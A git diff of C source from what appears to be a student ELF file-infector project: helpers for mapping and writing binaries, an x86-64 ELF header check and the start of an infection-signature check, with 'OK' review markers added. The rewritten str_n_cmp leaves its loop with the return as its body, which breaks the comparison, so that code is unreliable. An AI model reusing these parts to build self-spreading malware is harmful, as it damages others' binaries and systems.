@@ -6,7 +6,7 @@
 /*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2022/07/22 12:32:02 by fcadet            #+#    #+#             */
-/*   Updated: 2022/07/26 13:17:17 by fcadet           ###   ########.fr       */
+/*   Updated: 2022/07/26 16:28:41 by fcadet           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -60,13 +60,16 @@ t_buffs			buffs = { 0 };
 
 uint8_t			*mem = NULL;
 uint64_t		x_pad = 0;
+
 /*
+OK
 int		ret_close(int fd, int ret) {
 	if (fd >= 0)
 		close(fd);
 	return (ret);
 }
 
+OK
 void	get_full_path(char *s1, char *s2, uint8_t *buff) {
 	for (; *s1; ++s1, ++buff)
 		*buff = *s1;
@@ -75,13 +78,13 @@ void	get_full_path(char *s1, char *s2, uint8_t *buff) {
 	*buff = '\0';
 }
 
+OK
 int		str_n_cmp(char *s1, char *s2, int n) {
-	for (; *s1 && *s1 == *s2; ++s1, ++s2)
-		if (!--n)
-			break;
+	for (; *s1 && *s1 == *s2 && --n; ++s1, ++s2)
 	return (*s1 - *s2);
 }
 
+OK
 int64_t			get_fd_size(int fd) {
 	int64_t		size;
 
@@ -90,6 +93,7 @@ int64_t			get_fd_size(int fd) {
 	return (size);
 }
 
+OK
 int		write_pad(int fd, uint64_t size) {
 	uint64_t			write_sz = 0;
 	int64_t				w_ret;
@@ -103,6 +107,7 @@ int		write_pad(int fd, uint64_t size) {
 	return (0);
 }
 
+OK
 static int		map_file(uint8_t *path) {
 	int			src;
 	int64_t		s_ret;
@@ -117,6 +122,7 @@ static int		map_file(uint8_t *path) {
 	return (ret_close(src, 0));
 }
 
+OK
 static void		write_mem(uint8_t *path) {
 	int			dst;
 	int64_t		w_ret;
@@ -135,15 +141,18 @@ static void		write_mem(uint8_t *path) {
 	close(dst);
 }
 
+OK
 static int		test_elf_hdr(void) {
 	if (str_n_cmp((char *)hdrs.elf->e_ident, (IDENT), 5)
-			|| (hdrs.elf->e_type != ET_EXEC && hdrs.elf->e_type != ET_DYN)
+			|| !(hdrs.elf->e_type == ET_EXEC || hdrs.elf->e_type == ET_DYN)
 			|| hdrs.elf->e_machine != EM_X86_64
-			|| (hdrs.elf->e_shstrndx == SHN_UNDEF || hdrs.elf->e_shstrndx == SHN_XINDEX))
+			|| hdrs.elf->e_shstrndx == SHN_UNDEF
+			|| hdrs.elf->e_shstrndx == SHN_XINDEX)
 		return (-1);
 	return (0);
 }
 
+OK
 static int		check_infection(void) {
 	if (sz.mem < SIGN_SZ)
 		return (-1);
